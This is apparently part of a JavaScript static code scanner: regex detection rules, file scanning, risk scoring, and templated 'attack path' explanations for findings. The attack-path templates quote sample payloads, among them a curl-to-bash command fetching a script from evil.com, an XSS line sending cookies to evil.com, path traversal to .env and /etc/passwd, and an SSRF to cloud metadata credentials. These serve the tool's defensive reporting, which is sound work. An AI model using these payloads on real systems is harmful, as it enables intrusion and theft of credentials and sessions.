    fix:'Always use execFile with array args and shell:false.',
    patterns:[
      /child_process.*exec\s*\(`[^`]*\$\{[^}]*(?:req\.|body\.|query\.)/gi,
      /spawn\s*\([^,]+,\s*\[[^\]]*(?:req\.|body\.|query\.)/gi,
    ]
  },
  {
    id:'SAST-049', name:'Insecure File Write', cwe:'CWE-73', sev:'HIGH',
    owasp:'A01:2021', mitre:'T1083', confidence:'MEDIUM',
    desc:'User-controlled filename in file write operation. Path traversal possible.',
    fix:'Sanitize filename: path.basename(input) and validate against allowlist.',
    patterns:[
      /(?:writeFile|writeFileSync|appendFile)\s*\([^)]*(?:req\.|params\.|query\.)/gi,
      /createWriteStream\s*\([^)]*(?:req\.|params\.|query\.)/gi,
    ]
  },
  {
    id:'SAST-050', name:'Dependency on Deprecated crypto API', cwe:'CWE-327', sev:'LOW',
    owasp:'A02:2021', mitre:'T1552', confidence:'HIGH',
    desc:'Node.js deprecated crypto methods used. May be removed in future versions.',
    fix:'Update to current crypto API. Use crypto.createHash("sha256") etc.',
    patterns:[
      /crypto\.createCredentials\s*\(/gi,
      /crypto\.Credentials\s*\(/gi,
    ]
  },

  // ── REACT / FRONTEND ─────────────────────────────────────────────────────────
  {
    id:'SAST-051', name:'React dangerouslySetInnerHTML', cwe:'CWE-79', sev:'HIGH',
    owasp:'A03:2021', mitre:'T1185', confidence:'HIGH',
    desc:'React dangerouslySetInnerHTML with dynamic content. XSS possible.',
    fix:'Use DOMPurify.sanitize() before passing to dangerouslySetInnerHTML.',
    patterns:[
      /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:/gi,
    ]
  },
  {
    id:'SAST-052', name:'localStorage Sensitive Data', cwe:'CWE-312', sev:'MEDIUM',
    owasp:'A02:2021', mitre:'T1552', confidence:'MEDIUM',
    desc:'Sensitive data stored in localStorage. Accessible to any JS on page.',
    fix:'Never store tokens/passwords in localStorage. Use httpOnly cookies.',
    patterns:[
      /localStorage\.setItem\s*\([^)]*(?:token|password|secret|key|auth)/gi,
      /localStorage\[["'](?:token|password|jwt|auth)["']\]\s*=/gi,
    ]
  },
  {
    id:'SAST-053', name:'postMessage Without Origin Check', cwe:'CWE-346', sev:'MEDIUM',
    owasp:'A07:2021', mitre:'T1185', confidence:'MEDIUM',
    desc:'postMessage listener without origin validation. Cross-origin data injection.',
    fix:'Always check event.origin: if(event.origin!=="https://trusted.com") return',
    patterns:[
      /addEventListener\s*\(\s*["']message["'][^)]*\)(?![\s\S]{0,100}origin)/gi,
      /onmessage\s*=\s*function[^{]*\{(?![\s\S]{0,100}origin)/gi,
    ]
  },

  // ── GENERAL SECURITY HYGIENE ────────────────────────────────────────────────
  {
    id:'SAST-054', name:'Timing Attack in Auth', cwe:'CWE-208', sev:'MEDIUM',
    owasp:'A07:2021', mitre:'T1110', confidence:'MEDIUM',
    desc:'String comparison in auth uses === which leaks timing info.',
    fix:'Use crypto.timingSafeEqual(Buffer.from(a),Buffer.from(b))',
    patterns:[
      /(?:token|secret|password|hash)\s*===\s*(?:req\.|input|provided)/gi,
      /if\s*\(\s*(?:token|secret|apiKey)\s*!==\s*/gi,
    ]
  },
  {
    id:'SAST-055', name:'Error Stack Trace Exposed', cwe:'CWE-209', sev:'LOW',
    owasp:'A05:2021', mitre:'T1082', confidence:'MEDIUM',
    desc:'Full error stack trace sent to client. Internal paths and logic exposed.',
    fix:'Log errors server-side only. Send generic messages to client.',
    patterns:[
      /res\.(?:send|json)\s*\([^)]*(?:err\.stack|error\.stack|e\.stack)/gi,
      /res\.status.*\.json\s*\([^)]*stack/gi,
      /res\.send\s*\(\s*err\s*\)/gi,
    ]
  },
];

// ─── Main SAST scan ───────────────────────────────────────────────────────────
function scanSAST(content, filePath) {
  const ext = '.' + (filePath.split('.').pop() || '').toLowerCase();
  const lower = filePath.toLowerCase();
  if (['.min.js','.min.css','.map','.lock','.png','.jpg','.gif',
       '.pdf','.zip','.exe','.bin','.ttf','.woff','.woff2'].some(e => lower.endsWith(e))) return [];
  if (/node_modules|vendor\/|dist\/|build\/|\.min\./.test(filePath)) return [];

  const findings = [];
  const lines    = content.split('\n');
  const seen     = new Set();

  for (const rule of RULES) {
    for (const pattern of rule.patterns) {
      try {
        const re = new RegExp(pattern.source, pattern.flags);
        let match;
        while ((match = re.exec(content)) !== null) {
          const lineNum  = content.substring(0, match.index).split('\n').length;
          const lineText = lineNum <= lines.length ? lines[lineNum - 1] : '';

          // Skip comment lines
          const t = lineText.trim();
          if (t.startsWith('//') || t.startsWith('#') || t.startsWith('*') ||
              t.startsWith('/*') || t.startsWith('<!--')) continue;

          // Skip test files for LOW confidence rules
          if (rule.confidence === 'LOW' && /test|spec|mock|__tests__|\.test\.|\.spec\./.test(filePath)) continue;

          const key = rule.id + ':' + lineNum;
          if (seen.has(key)) continue;
          seen.add(key);

          findings.push({
            id:          rule.id + '-' + Date.now() + '-' + findings.length,
            type:        'SAST',
            name:        rule.name,
            severity:    rule.sev,
            cwe:         rule.cwe,
            owasp:       rule.owasp,
            mitre:       rule.mitre || '',
            confidence:  rule.confidence,
            file:        filePath,
            line:        lineNum,
            lineText:    lineText.trim().substring(0, 120),
            description: rule.desc,
            remediation: rule.fix,
          });
        }
      } catch (_) {}
    }
  }
  return findings;
}

// ─── Risk scoring ─────────────────────────────────────────────────────────────
function riskScore(findings) {
  if (!findings.length) return {
    score: 0, level: 'PASS', label: 'PASS', grade: 'A',
    criticals: 0, highs: 0, mediums: 0, total: 0
  };

  const W  = { CRITICAL: 10, HIGH: 5, MEDIUM: 2, LOW: 0.5 };
  const CM = { HIGH: 1.0, MEDIUM: 0.7, LOW: 0.4 };

  const raw = findings.reduce((acc, f) => {
    return acc + (W[f.severity] || 1) * (CM[f.confidence] || 1.0);
  }, 0);

  const score     = Math.min(100, Math.round(raw * 2));
  const criticals = findings.filter(f => f.severity === 'CRITICAL').length;
  const highs     = findings.filter(f => f.severity === 'HIGH').length;
  const mediums   = findings.filter(f => f.severity === 'MEDIUM').length;

  let level, label, grade;
  if (criticals > 0 || score >= 80)  { level='FAIL'; label='FAILED';       grade='F'; }
  else if (score >= 50 || highs > 2) { level='WARN'; label='BLOCK_DEPLOY'; grade='D'; }
  else if (score >= 25)              { level='WARN'; label='WARN';          grade='C'; }
  else if (score >= 10)              { level='PASS'; label='PASS';          grade='B'; }
  else                               { level='PASS'; label='PASS';          grade='A'; }

  return { score, level, label, grade, criticals, highs, mediums, total: findings.length };
}

// ─── Attack paths ─────────────────────────────────────────────────────────────
function attackPaths(findings, repoName) {
  const paths   = [];
  const yr      = new Date().getFullYear();
  let   counter = 100;

  const byName = (kw) => findings.filter(f =>
    f.name.toLowerCase().includes(kw.toLowerCase())
  );

  const TEMPLATES = [
    {
      filter:'SQL', cwe:'CWE-89', mitre:'T1190', sev:'CRITICAL',
      title:'SQL Injection → Full Database Compromise',
      steps: (f) => [
        `Unsanitized SQL query found in ${f.file} line ${f.line}.`,
        "Attacker injects: ' OR 1=1-- to bypass auth, or UNION SELECT to enumerate tables.",
        'Dumps all credentials, PII, session tokens, and payment data.',
        'Drops tables or installs persistent backdoor via xp_cmdshell.',
      ]
    },
    {
      filter:'Command', cwe:'CWE-78', mitre:'T1059', sev:'CRITICAL',
      title:'Command Injection → Remote Code Execution → Full Compromise',
      steps: (f) => [
        `exec() with user input found at ${f.file} line ${f.line}.`,
        'Attacker injects: ; curl http://evil.com/shell.sh | bash',
        'Executes arbitrary OS commands as the Node.js process user.',
        'Establishes reverse shell. All data exfiltrated.',
      ]
    },
    {
      filter:'XSS', cwe:'CWE-79', mitre:'T1185', sev:'HIGH',
      title:'Stored XSS → Session Hijacking → Account Takeover',
      steps: (f) => [
        `innerHTML assigned user input at ${f.file} line ${f.line}.`,
        'Attacker stores: <script>document.location="https://evil.com?c="+document.cookie</script>',
        'Every user loading the page sends their session cookie to attacker.',
        'Sessions hijacked. Full account takeover.',
      ]
    },
    {
      filter:'Path Traversal', cwe:'CWE-22', mitre:'T1083', sev:'HIGH',
      title:'Path Traversal → Sensitive File Disclosure',
      steps: (f) => [
        `Unvalidated file path at ${f.file} line ${f.line}.`,
        'Attacker requests: ?file=../../.env or ?file=../../etc/passwd',
        'Server returns environment file with all secrets.',
        'AWS keys, DB credentials, JWT secrets all compromised.',
      ]
    },
    {
      filter:'JWT', cwe:'CWE-798', mitre:'T1552', sev:'CRITICAL',
      title:'Hardcoded JWT Secret → Token Forgery → Auth Bypass',
      steps: (f) => [
        `JWT signed with hardcoded secret at ${f.file} line ${f.line}.`,
        'Attacker extracts secret from public GitHub repo.',
        'Forges JWT: {"role":"admin","userId":"any"}.',
        'Bypasses all authentication. Admin access to all accounts.',
      ]
    },
    {
      filter:'SSRF', cwe:'CWE-918', mitre:'T1090', sev:'HIGH',
      title:'SSRF → Cloud Metadata Theft → Full AWS Compromise',
      steps: (f) => [
        `Server HTTP request with user URL at ${f.file} line ${f.line}.`,
        'Attacker sends: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'EC2 metadata service returns temporary AWS credentials.',
        'Full AWS account access with leaked cloud credentials.',
      ]
    },
    {
      filter:'NoSQL', cwe:'CWE-943', mitre:'T1190', sev:'CRITICAL',
      title:'NoSQL Injection → Authentication Bypass → Data Exfiltration',
      steps: (f) => [
        `MongoDB query receives unsanitized body at ${f.file} line ${f.line}.`,
        'Attacker sends: {"username":{"$gt":""},"password":{"$gt":""}}',
        'MongoDB matches all records — auth completely bypassed.',
        'Full database exfiltration without credentials.',
      ]
    },
    {
      filter:'Prototype', cwe:'CWE-1321', mitre:'T1190', sev:'HIGH',
      title:'Prototype Pollution → Authorization Bypass',
      steps: (f) => [
        `Object.assign with user input at ${f.file} line ${f.line}.`,
        'Attacker sends: {"__proto__":{"isAdmin":true}}',
        'Pollutes Object.prototype — all objects gain isAdmin:true.',
        'Admin checks bypassed globally across entire application.',
      ]
    },
    {
      filter:'SSTI', cwe:'CWE-94', mitre:'T1059', sev:'CRITICAL',
      title:'Template Injection (SSTI) → Remote Code Execution',
      steps: (f) => [
        `User input rendered as template at ${f.file} line ${f.line}.`,
        "Attacker injects: {{7*7}} — if 49 rendered, SSTI confirmed.",
        "Escalates to: {{''.__class__.__mro__[1].__subclasses__()}} for RCE.",
        'Arbitrary Python/Node code executed on server.',
      ]
    },
  ];

  for (const tpl of TEMPLATES) {
    const matches = byName(tpl.filter);
    if (!matches.length) continue;
    const f = matches[0];
    paths.push({
      id:       `SEC-PATH-${yr}-${counter++}`,
      cwe:      tpl.cwe,
      mitre:    tpl.mitre,
      severity: tpl.sev,
      title:    tpl.title,
      file:     f.file,
      line:     f.line,
      steps:    tpl.steps(f),
    });
  }

  // Secret-based attack paths
  const secrets = findings.filter(f => f.type === 'SECRET');
  secrets.slice(0, 2).forEach(f => {
    paths.push({
      id:       `SEC-PATH-${yr}-${counter++}`,
      cwe:      f.cwe || 'CWE-798',
      mitre:    'T1552.001',
      severity: 'CRITICAL',
      title:    `${f.name} Enables Unauthorized Service Access`,
      file:     f.file,
      line:     f.line,
      steps: [
        `${f.name} found in ${f.file} line ${f.line} via public repo scan.`,
        'Attacker clones repo and extracts credential from git history.',
        `Uses stolen ${f.name} to authenticate against external service.`,
        'Unauthorized access granted. Data exfiltration or fraudulent actions performed.',
      ]
    });
  });

  if (!paths.length) {
    paths.push({
      id: `SEC-PATH-${yr}-000`, cwe:'N/A', severity:'INFO',
      title:'No Critical Attack Paths Detected', file:'—', line:0, mitre:'N/A',
      steps:[
        'No critical or high-severity vulnerabilities found.',
        'Continue monitoring future commits with automated scanning.',
      ]
    });
  }

  return paths;
}

module.exports = { scanSAST, riskScore, attackPaths };
